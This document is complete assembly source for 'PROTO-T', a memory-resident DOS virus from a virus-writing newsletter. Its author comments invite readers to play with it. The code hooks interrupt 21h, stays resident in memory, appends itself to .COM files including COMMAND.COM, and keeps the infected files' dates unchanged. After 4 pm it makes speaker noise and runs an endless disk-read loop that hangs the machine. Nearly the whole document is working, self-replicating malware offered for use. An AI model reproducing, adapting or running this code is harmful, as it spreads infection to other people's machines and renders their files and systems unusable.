;PROTO-T virus: a simple, memory resident .COM infector for
;Crypt newsletter 9. Assemble with any MASM/TASM compatible assembler.
;
;On call, PROTO-T will manipulate the interrupt table directly, hooking
;int 21h and decreasing the amount of memory by a little over 1k. 
;It will infect COMMAND.COM
;if a shell is installed while the virus is in RAM. At start,
;PROTO-T polls the system time. If it is after 4:00 in the
;afternoon, the speaker will issue a hideous ringing noise and the
;hard file will be read very quickly, faking a massive Michelangelo-style
;trashing. The disk will continue to read until the user restores
;control by booting. (I took this slick routine from the first issue
;of "Computer Virus Developments Quarterly," edited by Mark Ludwig, American
;Eagle Publishing, Tucson, AZ.) The disk effect is harmless, but unsettling
;to those surprised by it. Heh.
;
;Files infected with PROTO-T will generally function normally until
;4 in the afternoon, when the virus locks them up until the next
;day by way of the nuisance routines described above. Infected files have
;the ASCII string, 'This program is sick. [PROTO-T by Dumbco, INC.]'
;appended to them at the end where the body of the virus is located.
;
;PROTO-T is not currently scanned. However, its modifications are easily
;flagged by a good file integrity checker. For example, Dr. Solomon's 
;Toolkit picked PROTO-T changes off an infected disk with both the QCV 
;(quick check virus) and CHKVIRUS (CHECKVIRUS) utilities. Unfortunately, 
;the novice user is left on his own by the Toolkit to determine the cause 
;of the changes - a drawback which diminishes the software's value 
;considerably, IMHO.
;
;I encourage you to play with PROTO-T by Dumbco. It is a 
;well-behaved resident virus, useful in demonstrating the behavior
;of simple resident infectors and how they can "pop-up" suddenly and
;ruin your day. Of course, files infected by PROTO-T are, for all
;intents and purposes, useless for future computing unless you like
;the idea of a resident virus keeping you company and freezing up
;your work late in the afternoon.
;
;Known incompatibilities:  PROTO-T will behave weirdly on machines
;using SYMANTEC's NDOS as a command processor. And some caches will
;cause PROTO-T to hang the machine immediately. For best results,
;plain vanilla MS-DOS 4.01 and MS-DOS 5.0 with or without memory 
;management seems to work fine. (Ain't this somethin': software
;advisories with a virus!)
;
;Code for PROTO-T was obtained from Nowhere Man's VCL 1.0 assembly libraries,
;& our European friends Dark Helmet and Peter Venkmann with their very
;complete code archives (in particular, the CIVIL_II template). The 
;'scarey ' subroutine was excerpted from "Computer Virus Developments 
;Quarterly", Vol. 1., No.1.


		.radix 16
     code       segment
		model  small
		assume cs:code, ds:code, es:code

		org 100h

length          equ offset last - begin
virus_length    equ length / 16d 

host:          db 0E9h, 03h, 00h, 44h, 48h, 00h         ;jump + infection
							;marker in host

begin:          
		
		call virus             ;make call to
				       ;push instruction pointer on stack

virus:          
		

		mov     ah,02Ch          ;DOS get time function
		int     021h
		mov     al,ch            ;Copy hour into AL
		cbw                      ;Sign-extend AL into AX
		cmp     ax,0010h         ;Did the function return 16 (4 pm)?
		jge     malfunkshun      ;If after 4 pm, do Proto-T thang!
		jmp     getonwithit
		
malfunkshun:                                 ;sound and fury start
		cli                          ;turn off interrupts
		mov     dx,2                 
agin1:          mov     bp,40                ;do 40 cycles of sound
		mov     si,1000              ;1st frequency
		mov     di,2000              ;2nd frequency
		mov     al,10110110b         ;address of channel 2 mode 3
		out     43h,al               ;send to port
agin2:          mov     bx,si                ;place sound number in bx
backerx:        mov     ax,bx                ;now put in ax
		out     42h,al               
		mov     al,ah                
		out     42h,al               
		in      al,61h               ;get port value
		or      al,00000011b         ;turn speaker on
		out     61h,al               
		mov     cx,2EE0h             ;delay 
looperx:        loop    looperx        ;do nothing loop so sound is audible
		xchg    di,si                
		in      al,61h               ;get port value
		and     al,11111100b         ;AND - turn speaker off
		out     61h,al               ;send it
		dec     bp                   ;decrement repeat count
		jnz     agin2                ;if not = 0 do again
		mov     ax,10                ;10 repeats of 60000 loops
back:           mov     cx,0EA60h            ;loop count (in hex for TASM)
loopery:        loop    loopery         ;delay loops - no sound between bursts
		dec     ax                   
		jnz     back                 ;if not = 0 loop again
		dec     dx                   
		jnz     agin1                ;if not = 0 do whole thing again
		sti                          ;restore interrupts 
		
		
		
		mov     si,0              ;scarey part: drive reads real
scarey:         lodsb                     ;fast ala Michelangelo-style
		mov     ah,al             ;over-write, but this routine only
		lodsb                     ;gets random bytes here for a 
		and     al,3              ;cylinder to READ
		mov     dl,80h
		mov     dh,al
		mov     ch,ah
		mov     cl,1
		mov     bx,offset last    ;buffer to read into
		mov     ax,201h
		int     13h
		jmp     short scarey      ;yow! scarey! just think if this
					  ;was made by someone not as nice as
					  ;me

note            db     'This program is sick. [PROTO-T by Dumbco, INC.]'

getonwithit:    pop     bp                              ; get IP from stack.
		sub     bp,109h                         ; adjust IP.

restore_host:   mov     di,0100h                        ; recover beginning
		lea     si,ds:[carrier_begin+bp]        ; of carrier program.
		mov     cx,06h
		rep     movsb


check_resident: mov     ah,0A0h                      ;check if virus
		int     21h                          ;already installed.
		cmp     ax,0001h
		je      end_virus

adjust_memory:  mov     ax,cs                        ;get Memory 
		dec     ax                           ;Control Block
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a        ;check if last
						     ;block -
		jne     abort                        ;if not last block,
						     ;end
		mov     ax,ds:[0003]                 ;decrease memory
		sub     ax,50                        ;by 1kb 
		mov     ds:0003,ax

install_virus:  mov     bx,ax                        ;PSP
		mov     ax,es                        ;virus start 
		add     ax,bx                        ;in memory
		mov     es,ax
		mov     cx,length                    ;cx = length virus
		mov     ax,ds                        ;restore ds
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin+bp]             ;point to start virus
		lea     di,es:0100                   ;point to destination
		rep     movsb                        ;copy virus in
						     ;memory
		mov     [virus_segment+bp],es        ;store start of virus
						     ;in memory
		mov     ax,cs                        ;restore extra segment
		mov     es,ax

hook_vector:    cli                              ;disable interrupts
						 ;because we're manipulating
		mov     ax,3521h                 ;the interrupt table and a   
						 ;crash would look bad
		int     21h                      ;function 3521h - retrieve
		mov     ds,[virus_segment+bp]    ;address of current handler
		mov     ds:[old_21h-6h],bx
		mov     ds:[old_21h+2-6h],es
		mov     dx,offset main_virus - 6h
		mov     ax,2521h                ;copy new address (virus) to
		int     21h                     ;interrupt table
		sti                             ;interrupts on

abort:          mov     ax,cs                  ;restore everything
		mov     ds,ax
		mov     es,ax
		xor     ax,ax

end_virus:      

		
		mov     bx,0100h               ;jump to beginning
		jmp     bx                     ;of host file

		
;***************************************************************************

main_virus:     pushf                                   
		cmp     ah,0A0h                    ;check for virus 
		jne     new_21h                    ;no virus call
		mov     ax,0001h                   ;ax = id
		popf                               ;return id     
		iret
		
new_21h:        push    ds                         ;save registers
		push    es
		push    di
		push    si
		push    ax
		push    bx
		push    cx
		push    dx

		cmp     ah,40h
		jne     check_05
		cmp     bx,0004h
		jne     check_05

check_05:       cmp     ah,05h
		jne     check_exec

check_exec:     cmp     ax,04B00h             ;intercept execute function
		jne     continue
		mov     cs:[name_seg-6],ds
		mov     cs:[name_off-6],dx
		jmp     chk_com               ;goto check target

continue:       pop     dx                    ;restore registers
		pop     cx
		pop     bx
		pop     ax
		pop     si
		pop     di
		pop     es
		pop     ds
		popf
		jmp     dword ptr cs:[old_21h-6]

chk_com:        cld                           ;check extension of loaded file
		mov     di,dx                 ;for COM
		push    ds
		pop     es
		mov     al,'.'                  ;search extension
		repne   scasb                   ;for 'COM', so
		cmp     word ptr es:[di],'OC'   ;check 'CO'
		jne     continue                ;and
		cmp     word ptr es:[di+2],'M'  ;check 'M'
		jne     continue                      
						     
		call    set_int24h                   
		call    set_attribute
				
open_file:      mov     ds,cs:[name_seg-6]   ;name of target file
		mov     dx,cs:[name_off-6]
		mov     ax,3D02h             ;open file
		call    do_int21h            ;simulate int21 call, see below
		jc      close_file
		push    cs
		pop     ds
		mov     [handle-6],ax
		mov     bx,ax   

		call    get_date        
		
check_infect:   push    cs
		pop     ds
		mov     bx,[handle-6]        ;read first 6 bytes
		mov     ah,3fh
		mov     cx,06h
		lea     dx,[carrier_begin-6]
		call    do_int21h
		mov     al, byte ptr [carrier_begin-6]+3 ; check initials
		mov     ah, byte ptr [carrier_begin-6]+4 ; 'D' and 'H'
		cmp     ax,[initials-6]
		je      save_date                ;if equal, already
						 ;infected
		
get_length:     mov     ax,4200h                 ;set file pointer to begin
		call    move_pointer
		mov     ax,4202h                 ;set file pointer to end
		call    move_pointer
		sub     ax,03h                   ;ax = file length
		mov     [length_file-6],ax
		
		call    write_jmp
		call    write_virus              ;summon write virus to file                     
						 
save_date:      push    cs                       ;save date of file
		pop     ds
		mov     bx,[handle-6]
		mov     dx,[date-6]
		mov     cx,[time-6]
		mov     ax,5701h
		call    do_int21h

close_file:     mov     bx,[handle-6]
		mov     ah,03eh                    ;close file
		call    do_int21h
		
		mov     dx,cs:[old_24h-6]          ;restore int24h
		mov     ds,cs:[old_24h+2-6]
		mov     ax,2524h
		call    do_int21h
		
		jmp     continue         
		
		


new_24h:        mov     al,3            ;critical error handler
		iret


;---------------------------------------------------------------------------
;                       PROCEDURES
;---------------------------------------------------------------------------



move_pointer:   push    cs
		pop     ds
		mov     bx,[handle-6]
		xor     cx,cx
		xor     dx,dx
		call    do_int21h
		ret
						;since virus owns int21, a
do_int21h:      pushf                           ;direct call would be counter
		call    dword ptr cs:[old_21h-6];productive, so do a pushf
		ret                           ;and call combination - Dark
					      ;Angel's virus guide is great
write_jmp:      push    cs                    ;at expalining this
		pop     ds
		mov     ax,4200h        ;set pointer to beginning of file
		call    move_pointer
		mov     ah,40h
		mov     cx,01h
		lea     dx,[jump-6]
		call    do_int21h
		mov     ah,40h
		mov     cx,02h
		lea     dx,[length_file-6]
		call    do_int21h
		mov     ah,40h
		mov     cx,02h
		lea     dx,[initials-6]
		call    do_int21h
		ret

write_virus:    push    cs
		pop     ds
		mov     ax,4202h       ;write to file function
		call    move_pointer
		mov     ah,40
		mov     cx,length      ;virus length
		mov     dx,100
		call    do_int21h      ;do it
		ret

get_date:       mov     ax,5700h        ;retrieve date function
		call    do_int21h       ;do it
		push    cs
		pop     ds
		mov     [date-6],dx      ;restore date & time
		mov     [time-6],cx
		ret
					 ;set up critical error handler
set_int24h:     mov     ax,3524h         ;request address of current handler
		call    do_int21h        ;simulate int21 call
		mov     cs:[old_24h-6],bx
		mov     cs:[old_24h+2-6],es
		mov     dx,offset new_24h-6
		push    cs
		pop     ds
		mov     ax,2524h         ;set vector to virus handler
		call    do_int21h        ;do it
		ret

set_attribute:  mov     ax,4300h           ;get attribute
		mov     ds,cs:[name_seg-6]
		mov     dx,cs:[name_off-6]
		call    do_int21h
		and     cl,0feh                ;set attribute
		mov     ax,4301h
		call    do_int21h               
		ret

	




;---------------------------------------------------------------------------
;                               DATA
;---------------------------------------------------------------------------


old_21h         dw  00h,00h
old_17h         dw  00h,00h
old_24h         dw  00h,00h
carrier_begin   db  090h, 0cdh, 020h, 044h, 048h, 00h
jump            db  0E9h
name_seg        dw  ?
name_off        dw  ?
virus_segment   dw  ?
length_file     dw  ?
handle          dw  ?
date            dw  ?
time            dw  ?
initials        dw  4844h
last            db  090h

code            ends
		end host
